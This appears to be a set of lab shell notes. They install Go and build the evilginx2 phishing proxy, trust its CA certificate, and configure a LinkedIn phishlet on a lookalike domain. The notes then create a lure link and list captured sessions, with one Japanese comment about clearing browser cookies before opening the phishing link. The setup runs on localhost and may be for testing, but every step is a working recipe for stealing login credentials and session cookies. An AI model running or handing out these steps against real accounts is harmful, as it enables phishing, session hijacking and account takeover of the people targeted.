
~~~
wget https://golang.org/dl/go1.17.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.17.5.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc
go version

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH

# fish
set -x GOPATH "/home/user/.go"
set -x GOROOT "/home/user/go"
set -x PATH "$GOPATH/bin:$GOROOT/bin:$PATH"

mkdir ~/.go

wget https://github.com/kgretzky/evilginx2/archive/refs/tags/v3.0.0.tar.gz
tar xf v3.0.0.tar.gz
cd evilginx2-3.0.0

make

sudo ./build/evilginx -p ./phishlets -t ./redirectors -P 127.0.0.1:33500 -developer

sudo cp /root/.evilginx/crt/ca.crt /usr/local/share/ca-certificates/evilginx.crt
sudo update-ca-certificates

: config domain not-a-phish.com
: config ipv4 127.0.0.1
: phishlets hostname linkedin totally.legit.linkedin.not-a-phish.com
: phishlets enable linkedin
: lures create linkedin
: lures
: lures get-url 0

# フィッシング リンクを開く前に、必ず Web ブラウザーのすべての Cookie を削除してください。

: sessions
: sessions 0


~~~